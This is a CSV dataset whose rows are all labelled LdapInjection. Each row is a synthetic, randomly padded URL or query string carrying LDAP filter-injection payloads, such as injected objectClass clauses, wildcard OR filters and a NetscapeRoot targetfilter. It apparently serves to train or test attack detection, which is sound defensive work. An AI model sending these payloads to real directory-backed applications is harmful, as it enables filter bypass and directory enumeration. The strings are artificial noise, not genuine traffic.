id,class,vector
68,LdapInjection,/yt@uOehLmM6ye@DpmACs/thr1sAgfs2f5oed/-eCgFxtermoL8v/tE/r4mmL2ixk_pTBEJIl.tiff?arsstgeb7tee=+r&eaehlol=idk&hZOgpkGATFmD=82%29%28%26%28objectClass%3Dfcre%29%28%7C%28sn%3D++++Bhia%29%28cn%3D4o++++J*%29%29&RBYqdo_lU0=im9&rNiy9oenteis3=+%25%29tueepOOi
71,LdapInjection,/w7qswmnsrkk9/i0tUdSWGyMs2./f3utzatuieh/4TIuQOgLJqxh8Cr.nsf?th2=open-dd&dsfb=45&nnR=9&UOa4nLM0unionT@2=atma%29%28%26%28objectClass%3D+7e*%29&E9ti3dpcD=715&Kxg9jOdropHL=+i&snhd5d=160087&tjlrihS=unQ1pN%40vqw&qeep=taelnIpaiframei2eMe5&nhsddpXiHtIeno=lzortrozhFsmThn4
91,LdapInjection,/b-lZM4f/TDv@SxK.htm?ssenHLAorD=feeea%29%28+++%7C+%28ne%3D*%29
94,LdapInjection,/ee0a5fu/rehtaiQbehTco/ldVSUY86/erwbeysateNm/bdATYyoolau4tthhuVew/ax8j9X.iza/cYZam7nilhF6ae9d/hm@y.P41Kx43O.jpg?dtrNflti=%29+++%28++++%7C+++%288s%3Ddniu*%29&utfhioiskeecnem=8%40i_SA7%40uEj&oegeeepnr0a=er&nsO5te=nesots&bXOvvOM7=btaruItsaypac&9eaYauaotsn=ruehgerelt&eyRarutn=iyeA&ibapsheMi=oEadpeErcyiAr
102,LdapInjection,a5L2Su=mEr)(&(objectClass =    igr*)
103,LdapInjection,/wx0VYEDbL0_6oU/wj.jpg?dseslqAateiute=E&tsmane=84174100&ae=%29+%28++++%7C%28cn%3D*o+++%27brien*%29%28mail++%3D*o%27brien*++%29+&rnsp=fxsNl_H-l&disbueirsi8p=2564&ErV_7=s3Qz&g3n2eeuh=dies
104,LdapInjection,/tp12PblmLGYSb/tYyUX-/rM0GLoL4/vbscriptAP/l9ec6z.swf?uoeErew2=hipg3h%3Eart5oro&A2between5W=230549&pUFWQshutdownW=t%403vvIeNg-iy&ai7aaLrtreng2=6Ey&5ouuhcpmnensoua=811&s9teeorsy=ih8u_k_&cfz4nko0TDU9=64478465&1nVXRZAiGiEr=s++tlueg&hg3qorlgooi=16806&dmle8uywnwltocs=ae9jt&s1fe=ue%29%28%26%28objectClass+++%3D+++na*%29&2ulmv8up=85112175&eruBrEevte=o%26essg9yto
121,LdapInjection,/mOmie/e1vAAwuc6vTyDf9-/I4/Bnaentcesoccai2Or/HzYfuj.png?efdnam9eh=%29++++%28%7C+%28displayName%3Dhad*%29%28name++++%3D+++had*++++%29%28mail%3Dhad*++%29&sn=vWFfEcY&_YKDBmVandyP=uetelycNrUoltb&rfur=ecuah2esnS&tmir=is02otneai&tsto=tCkxVy5hOKr9&rt=teh&tcie25nnu=hlddb&1samCKo=7%5Cni&TKwinntLaTDh3Y=%3Ci9
136,LdapInjection,/r3IQ5._sewGtybra19/Srr2aesohshaantq/pRw3jGEs/NecUarue1fTpgnbgdog/aasV7i/aoharorumisetee/PjlTEs/sp0.Nk1xujQdxvQ.php4?Mw=%29+%28%7C++%28ona%3Dbrhue*%29
142,LdapInjection,/3q8fbLh./o55CTmpzE/5ZxhckFRP.jpeg?p5.cmdMemupdate=nb3d&ifewaoNee1cne=tWLe&p.IWY8nl7nVl=%7Cvin&wwghf=bGfv9biy&eniajc1ANerwshO=v069ls6ebaimprsou&atnpt0ydeiow=%29+%28++%7C+%28+cn%3D*o+++%27brien*+%29%28mail%3D*o+%27brien*%29+&ehn5ehd=81691647&s6sblalaezyl=rshutdown&oO3BexecS=44008662&dmasuuwo2iReec=2aAx_PHT&aeiEibe8ihftjtT=plocation&nnuyisatldfeon=xeLc7crleoa&9hwenyd1eeTeon=30626&egiyotd7u=2364760
148,LdapInjection,/oauhg2as/hertel7t5sitOime/Dth/0sF/iP7WSx71uRa.TiW/eMD1ABET5/d@V0RlwLjRRf8WXVnD/-DA.tiff?dtwa=scriptgtt4&Ha=049%29%28%26%28objectClass%3DeeEr%29%28%7C%28sn+++%3D++++eWlo%29%28cn%3Dso+++++J*%29%29&lrDghesa=aAi&httpXHtaL0ku.Ppasswd=%2Fy&fheg=rhasTde&tnAlgixyadtpt=oLNtJm2&fTendhnieyij=obbzitmn%7Er8y&EwrdwtY=6414711
179,LdapInjection,/hBW@Fk_TvlEVHoyX6f/mu-24wcraShLkN.uW_v/egzcvkSmHo_rCl3nMY/lo/8-0.w0HnaV/t84Of/f9HpasswdZX9EQC8tan.asp?yw4geiwhofqaqra=0524&p1eaBei=e63J2&nsbsniLfkavno=A&37vtmpLK_=gHRNEf&niDeeitzsEeMane=44&bfi4ed=copyf&eatiOn0esid=iy&ya=hbeormfexPehial&1vngnie=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29&kHoAua9=sk0sXMTu&ogaiLe3eErle=5j&joeHqblf=087752&estyle.l1=nconnect
195,LdapInjection,/2TOmuipti/yhyMyeZsa@g35WAC.pl?Z15BandF=%29+%28++%7C++%28displayName%3Dhad*%29++++%28name+++%3D++++had*++%29%28++++mail%3Dhad*%29
201,LdapInjection,/cei.jsp?hhRTri2=kraIyichhs9ds&oaetm76lad1ye3=kruiWeaatntenakiAj&tsosweaSdfme=Y5igeecOa&d1gEaDmdrse0k=74436
208,LdapInjection,/tq1jnZZAA19NOvv/tErqahuengaLg4/2wkt/onoxSetTenqe/opTba5eBe/fhpPtcdcn/b7bfU_2j1T/7vpornnA/o1/taf3f6gn/-Wi6likereplaceMx0/mjada.asp?64a=wkZ988h&Zetey=98%29%28%26%28objectClass%3D4sfo%29%28%7C%28sn++%3D++++ca%29%28cn%3DgfT+++++J*%29%29&W@T8=eoopenN&ooi=7af&sthsugnroHien=e&tshiodseh=7367&oexdphuecnd=document%7Ccho5t%3F%2Bsboot.inis&niUeaaELnodFa=bpd%29ies&bkelen2ME=fb7aderepornaaiy&M1bzt4Js.j=608979&fTmCUMIot=mrm&rowllphcrTpea=%2FAncoptg&zsea9urmjrz=t4jtauo3&IiMaa=tgc%5Cew4ahreade%25aeedf&XRHxp_6ynS=61692
215,LdapInjection,eoreebi=er/4&iiF3s=n5mi)( |(hn0oo=*)
218,LdapInjection,/rn@gpDpd4/s.tglJ/M9F/stmenhns7Ert3.js?wotmrta9tetm=ayhRxaeid%5D%5Bu&egyioeahyayf=7473520&sEenyOs=telneta5g7o5auaRigi&lhpibwaxnlto9l=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29&bhusATn6raxa=ne9&rIfe5=6aenAlre
247,LdapInjection,/nXr4zy/rgshteirsca8o/dN3gb/5HLHbinedFsock_streamM/e8g6DMpw1OwMFdAg/lTPMC9gow/jzA2N/e@UT/lL.php?anass=tnRCttrdvusropt&deriyai=vcI0e-&fgqeemeirSeq=in%29%28%7C+++%28rhcr%3D*%29&eseaYa2nocaUem=aS3+ireei&sYohrw6=wHo9zM
250,LdapInjection,/clr/exM16_Dof5iH/eLpfwactecsa/w@dTmeS77x/ug/sZPm/totkta0/ft/s_XPY/ex/8h2amoYsynajiaulf/id4tNb.jpg?5rDddlRevo=i&wj1=sp&ona6die1iU=Ts%3Cpidx%3A%28ann&sEtnssswtr=eewe%5DchO&UIc=%2B9e+script&1ielaidue2ceid=088&wnRD9rRVUin=%29+%28+%7C++%28++++cn%3D*o+%27brien*%29%28mail++++%3D*o+++%27brien*+%29+&sr=674&object277home=eoAaewtdxdMws
252,LdapInjection,/tnOccikiIfa6aAq.htm?VBiLnb=co7&MBqEg=2786704441&dspse9suhvmy=a7Z%29%28%7C+++%289c4hL%3D*%29
265,LdapInjection,wynhmciatR3=7545111&ecnRgotoE=tea)( | (6moe9=*)&meta_Lh2N=47314
270,LdapInjection,/uIHattrc/meeer1im/wmqSV39XAtMW_zall/eA8Yn4zh1LVM4BZh/iuAtC8McG_S/sdUBZ8aN.3Gteel/ndD6/3Bfid/t28uhwl/ysUi2nnetteOzjatie.tiff?n1=pas&1rdlrbAGwm=hEEuRB&faa=+mut%3EitcGkkR&sp3inOerkd=14391&mw8byservicesze_yp=2387%29%28%26%28objectClass%3Dica%29%28%7C%28sn++++%3D+++oxtg%29%28cn%3Dlre++++J*%29%29&LXXMA8uE=qyVvqefJl9i&I9=0zetz5&-VzY=91152&Ljmaad=llon&formpoAXwbGb=brnRsucel&iN0laixshidoX=ro%3CimispmetaF
280,LdapInjection,/rtfiYe4re/jdt/htaccesFhmQ7e@/1hammav7ekkweS/Oudsie8cTotejt/-Sphpm6/A34s1JfXq.9.nMo/ehfusmjt7iHas4n/xcd/t6y5f/3nnIziWe3umjkaXvvuz0.gif?
286,LdapInjection,/mLmstrfixs/a.o/ca0cEva.DYM@/reweE9iaHy0o73/tK9B2A6Agvn10lj/zfxBVUG6fN3Y.h.aspx?LeIi=wslntFsser&haateae=6a3kArxF8
287,LdapInjection,/eX/fkk-Q.bin?0QbgsoundCIi=%29++%28+++%7C++%28+++cn%3D*o+%27brien*+%29%28mail++%3D*o%27brien*++%29+++
300,LdapInjection,/faLsshuKrzsfOg/nM_aom3homeEmu/enejeb7gssFgcayodhoa/gX/fea/hPeatwltYe/P6Lj-servicesHorg/Te/shloeIfrmevRihjgs/nV1X1Ac.aspx?mEil=1950%29%28%26%28objectClass%3DxtlN%29%28%7C%28sn+++%3D+++ti%29%28cn%3Dnooc+++J*%29%29&jVhacCssta9yD=zQJPSrPLk&So9=tLki5a55xBF&7hideoilnq=394&sbe=8+l&hsiopid1tyU=aoijgHd&si=6120&G-jfh2Y@=48&CENadminxw=etc1Oaoaser2td%5Ccopyw&rx9i0O=2802222773
329,LdapInjection,/mcV7r/s2k/dc4C/6@b34PBcmd1YPJhN/qYbKkx.Mm4k6Wc5nrCf/jhLbN1IOc3f/omWZdI/83sh/QtzPIxp_Mmj4Id/7veRz6@dOlQV0MY/eEathtiyljLac.html?rrb6p=%29+%28++++%7C++%28+cn%3D*o%27brien*++++%29%28mail++++%3D*o+++%27brien*++++%29+++&2i9WX=Flar%3Eowi%7C&eirLjrha4t=4838112&yU=hopadmintklglaro&naetibobRalaesw=5&r@e0d=3056325&1soDggsipu=stuuiahrtore
343,LdapInjection,/gFpNSrKv/Hq9TI7-U/eKb8Z/uksoRAi/n1RdcG_A0ReDG.htm?eeeUprvnreue1=03%29%28%26%28objectClass%3DOyil%29%28%7C%28sn++%3D+ss%29%28cn%3Dwea+++J*%29%29
348,LdapInjection,/osoniesuteieieaTtmm.aspx?Afneoe1rdTNm=%29%28++++%7C++%28++++cn%3D*o+++%27brien*%29%28mail+%3D*o+%27brien*+%29&9hb73f=64&rspontp8joii=tz0%5Cr%7E%3CatShedbgsoundn5s&weWteEr2sh=8dgwtwwnxaswxtoknu
355,LdapInjection,p6Lz3CIcffwgetV=6ntzabonvzahn&Dicpnr6f=@a7em|ow&aDa8ioihwnhtevb=RStvninntgiee&rriithu= &phpbkXe=5&ddewiHjncme=ecorh&Aono=egErtnh1i4oi8ed
364,LdapInjection,/wps9stgae8oiqi/n@1IzlIZCYU/65I4Ua/yatTY8LtbE-fkox/aaesQweeoqpcp2scehfn/mY0F.nsf?yue3ssmp=366229&1eaIec9=cP%27%25uu&EjZdeleteN=ahEhcatiA0&n6moclbo=8&_T3HPDq1bgsound@=100522&Pnturussu9s=1382&eciz0akunNOve=dht0kdaO5n6&fnbK=fbeoqwEe&areAtfwlac5o=rnneue&Fgroup
371,LdapInjection,/LmY/4Ie1KzTcopyPVgnV.jpeg?eeaEeC5se0stip=%3Fiesystem&N8ggbrefrculTSn=%29%28+++%7C++%28ut%3Dhi*%29&Eiyeclo9ahaeske=30202193&1siUedsiitaeab=stv3.%40ab6&Xyscriptu_Dnc_7Vls=p4QsUYETcS&LoIAc=aToyS
372,LdapInjection,l1apfndO3p=ijhnconnect &vineee6rh8=05130527&eieBihi=53056634&habr=otandas/alike|qeri
373,LdapInjection,/s8qsatLi0Ri2iht/9sam/sIx8w/386W5xyeWShzn6EDW/2Zj0o0/rd/hX2t/AFzmZ8kjRh/hidotg9taMaiwns/9mmogyo.jpeg?19htUc=e3hijkdcOF2&MdaC=tojiframence6+t&q8=wuaooOlblIedeARndl&dea9l=sBU_f&SshnenelyCartte=nq5&nhRwjoqcfusn=852195&rehuqaefvu0ur=Od%3Dnsysteml%28rt%3DLebshtpassc%24t&tawnen=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29&tlurgePnwuoeig=64231
377,LdapInjection,/lx9aPD.zZnK3N/e@Pf7/nasUs6hMTnrsxh/Douqljue00aasl/NZ4/divjeDimglikejk/eHEIRBfS6fzjGVINbwgH/reoS9/rXN.VLPvT6Jm7d/dWvbyF/aed.cgi?aLasetroyneao0n=alf&elpodanquatN=9457%29%28%26%28objectClass%3DohTr%29%28%7C%28sn%3D+vt%29%28cn%3Du++++J*%29%29&ss=%7Esw&fbti=yi%2Fezd
378,LdapInjection,/8Nj-/2bJ5eniEsio/tibYz/O7@zsrXM-Qy/hV3AF8Z1wOkJ1MX/eowh8ed63ria.msf?Eefgkcbh4nS=bczn&DKLsqLU3=L%2Bnct&rsR8=q+l+xtrjgroup+byvs&DEc3Htnflessh=y0qKa_bq7Yfp&o4aaTmkwge0bZ=009160815&_EU.Gt0U=30&whOao=r&tdvf6lewEAit=stdinhrshxeitEirnns&jegd1chi=4295&azaetebaftoa=asN6m%29%28%26%28objectClass++++%3D+sa*%29&mmaokcouua7gN=17777&ltdOhee=u&lc=srs8a&a7nsnxa=5
380,LdapInjection,/ineamrorltAdc9Qe/tTr9sp/l-qI5eds7H/tmpSycxmlsyC-i0N1/iilaht/pCCibke30V2zzijK/KycrdsaaNdh7i.gif?e6atTnnewbsbuct=tirhoferen6&0sztetiSrey=riuhsadelete6fbvatwgetofaes+&J2I3Nz-iedropB=vsh%5Ce+laws5o&cohsso=%3Ecvoefne6i8+%5D&eyachpZr=2545449&nttetu=%29++%28%7C%28displayName%3Dhad*%29+++%28name+%3D+had*+++%29%28++++mail%3Dhad*++++%29&C-Ga=acekdmg+c2s+L
386,LdapInjection,/hcws/nk4I/LW6oX_pgJMrhVC/pA7-NlHG/tk78by2SVMe/beedm/Obhjg/3dt/mIRwteaeh2tcN/txZ7qexemsCwe@Y/qy9KZAMUJ8DvD_/JgeUb0ARLW3.jsp?svrj00n=iehtiBvoovdeko&sshhroroR5Wc79=updatet&edioBsetenbia=3862&irtt=eoo&tMbP6sMn=3696052&uQwhereLcedy=ar8hm&tvnhsh=o5Ygay7a&oz4sny3eea=4&iOtrsstorn=%26h
395,LdapInjection,/anonrjitttei/iTRkpE0UHRbN.h5bc/iuXg/d9lnBIt/nD1bqXIMKigERl-/cyO5euPVP/3JO8COVOmocha8QK-1/uyZAfP/bu4Fp1qsHKYa1VZKB/th4prJhd/dx8eZtrsqe/hiam.mspx?Cyisaej2js=n%3Boropositioncrs&oscemtrdogm6o=12&mtgltjN=erenqPste&1sEacletttH=t-n+roenetcatu%2Fio&1JaIsuUstmhcaa=tar&Anidropu2odRo=b+is1&tju=7rey&jirnt=en%29%28%26%28objectClass+++%3D++++e5a*%29&isItna7dt=h4+%3B3j%2Bpasswdo%5Du%3E
396,LdapInjection,/s9de666/ei/nonIha1/ttumdh/Vsreplacec28/mJnLe-q/pts0L9D13bBhtc/mxJQb.0YD_/nRt_xopGN/eoftvnenE50e/3yz0ksBSCoptGc@/dY6FxTMDUkoa31e.cfm?PtqtelnetKinweQ=mCS0MdDEUw&09G_Ueval8J%u=%29++%28+++%7C+%28displayName%3Dhad*%29++++%28name++%3D+had*+++%29%28++mail%3Dhad*%29&amt=t+h&2706jZxconnect8xE=6idt5ensoa5dtNduu&i4oienoS=c8O&atlsemwgeiJ=or%26utrurtr&oalyttghW0tr7=wer1dzemvaainebd6p&cn=5
397,LdapInjection,/nMosaaal9f/rIrlhotSxtlnlde/m3Nbt1BQjDId3DVhy/unTicnns/eyGg0t/a422X@fDZDXj/TrEV/duTXxgnNJqC9hs4XcDZP/uL/.PqeHwp-dNm/FGbqO2JydhaSxp_%u.shtml?5group
412,LdapInjection,/eyanPludmrosr/Gqt/EzavMibc3fntttedra/9.hpNurODR8KdBj.js?iIesiThutrwE=i6acEyaqengppu&wiavsaslirHcn7i=y6o1g&np=mondipstcI&h4ASX@=68&dhysaeAt=519165398&nlsudssyeEedde=9406&njr6e=qeqX9BGQH&3gNtmemeIineh=e&X_BcservicesJiJGbgsound=i7tLLjju0SJ&uPRrsglFsock_stream=%29+%28+%7C+%28displayName%3Dhad*%29%28name+++%3D++had*%29%28mail%3Dhad*++++%29&Hppdhhr1r=624205&sys=sd&tiio2Lt=00477729&pnleWHhn=kMu
424,LdapInjection,/2iesybi0rroihE/eZumaj0QaX5teH6itm@/su8w0esutidesc/tesoe0semhomephhe/passthruB7/dOaoeiunfvn/dJW0Zc/EHu/afasti0sstha/4xZ.0TUzVxJoSlB./c2et30sh4oceecezLctn.tiff?eoa=o9WntYq&object9Y7jy7=xuintdrtwrthfsce&ywdbrqtotohIow=2998&udlv=220&eWKOA-=hns%7E%7E%2Fhvwgetwindow.opendla-psuev+0&SwYSjmeta=97810880&kslfpiditIoYl7=9t&6VshutdownViPcB@@u=59363&seshw8trna=dosc%3Bietihotg9+&9nRrn9diReH=pr&psfsea=imde%2Fpositionnw0Qun%27Ag&ieooteou=%29+++%28+%7C+++%28displayName%3Dhad*%29++++%28name+++%3D+had*+%29%28+mail%3Dhad*++%29&0wHoG=767
447,LdapInjection,/nX77c.aM6QMG@s/go/oScVJ/eotroee/e1uyte8uc6Bs7ab.pl?nh8scriptU8oX=qin3UwL4&eDa=j3ssfneiletidn&tixb4drne=44691534&GlJU8v.Ehomeetc=0prio%5Cfte5&itamrtifeehd=tar2swru&aeye=koBtbgsound0egm+%3D+o&kMDchildchild9Pqo=428555007&doarbk=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29&IeinputshutdownkLd=n%7E%28in&xkEo7f=o5ip
467,LdapInjection,/nn/tyYwsbIg@y/sohtetaEeCteEenobdmr/rH-JPA2L_0p10t7dk29/Feef1tafd8eede/%unsoYGopen/lcKfyzZoo/mLa6Qs3J.php?ssn=H0oAy%24b+a&ssrea7t8frreb=2Dg78Up3.&ifa24=1281822&urmhndehCsio9k=eheiframeacceptcka&Di6sY2J_=+e%5Da&3eB9aihajeosES=tM%40OtkA-ZjEa&McQ7q2bgsoundsE=4741180&ue0a_Gwhere=%29++++%28+%7C%28displayName%3Dhad*%29%28name++++%3D++had*++++%29%28+mail%3Dhad*++%29&ehjhiitAen=26330813&idqn4eacu=ownconnectsitu&lhszhntmeaj=slhed4&rhfe=8704&tWr9ikrhej0s4d=nennsObrd1
475,LdapInjection,/cmcNTIN@eJqsjlU/rIz6TB79nBtBGGcg/lseexKnM0VB4IpL4h/xieontfKtitb57psitl/nno/GvV/opEaCwHpeVnWUXsDE/t85aXiuhehexirsINs9/93_L-connecte8yon/oaqdtjoiil/pnmQ7v9KW6.aspx?egguahb=iI7%29%28+%7C++%28temfa%3D*%29&cmr5w=deletepmre%27n+nsA&CFr=rsieimg&xiaeneTnS=rboaduf
